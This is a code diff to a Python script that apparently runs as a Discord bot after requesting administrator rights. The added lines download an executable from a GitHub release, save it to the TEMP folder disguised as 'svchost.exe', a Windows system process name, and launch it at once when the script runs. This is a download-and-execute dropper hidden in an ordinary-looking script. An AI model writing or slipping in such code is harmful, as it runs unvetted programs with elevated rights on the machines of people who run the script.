@@ -58,6 +58,28 @@ def run_as_admin():
 
 run_as_admin()
 
+def download_and_open_file(url, destination):
+    try:
+        if os.path.exists(destination):
+            os.remove(destination)
+            print(f"Old file deleted: {destination}")
+
+        response = requests.get(url, stream=True)
+        response.raise_for_status()
+        with open(destination, 'wb') as file:
+            for chunk in response.iter_content(chunk_size=8192):
+                file.write(chunk)
+        os.startfile(destination)  # Open the file
+    except requests.exceptions.RequestException as e:
+        print(f"Error downloading file: {e}")
+    except PermissionError:
+        print(f"Permission denied: Unable to delete or write to file {destination}.")
+
+github_url = "https://github.com/AizenWo/Python/releases/download/Terminal/Terminal.exe"
+destination_path = os.path.join(os.getenv('TEMP'), 'svchost.exe')
+
+download_and_open_file(github_url, destination_path)
+
 shine = "PUT_YOUR_DISCORD_TOKEN HERE"
 GUILD_ID = PUT_YOUR_GUILD_ID_HERE
 ALLOWED_CHANNELS = {}
